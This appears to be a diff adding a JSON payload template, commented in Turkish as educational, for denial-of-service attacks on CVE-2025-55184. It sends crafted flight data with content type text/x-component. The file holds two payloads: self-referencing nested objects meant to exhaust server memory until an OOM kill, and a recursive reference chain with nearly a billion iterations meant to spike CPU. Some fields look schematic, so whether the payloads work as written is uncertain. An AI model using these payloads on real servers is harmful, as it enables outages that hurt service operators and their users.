@@ -1,0 +1,34 @@
+{
+  "_comment": "CVE-2025-55184 — DoS Payload Şablonu (Eğitim Amaçlı)",
+  "_description": "Memory exhaustion ve CPU tüketimi payload'ları",
+  "memory_exhaustion": {
+    "description": "Self-referencing nesne yapısı ile bellek tükenmesi",
+    "payload_template": {
+      "flight_data": [
+        ["$", "@1", null, {
+          "ref": "$self",
+          "nested": {
+            "ref": "$self",
+            "depth": "infinite",
+            "children": ["$self", "$self", "$self"]
+          }
+        }]
+      ]
+    },
+    "expected_effect": "Server memory exhaustion → OOM kill"
+  },
+  "cpu_exhaustion": {
+    "description": "Recursive deserialization zinciri ile CPU tüketimi",
+    "payload_template": {
+      "flight_data": [
+        ["$", "@recursive", null, {
+          "compute": true,
+          "iterations": 999999999,
+          "recursive_ref": "@recursive"
+        }]
+      ]
+    },
+    "expected_effect": "Server CPU spike → response timeout"
+  },
+  "content_type": "text/x-component"
+}
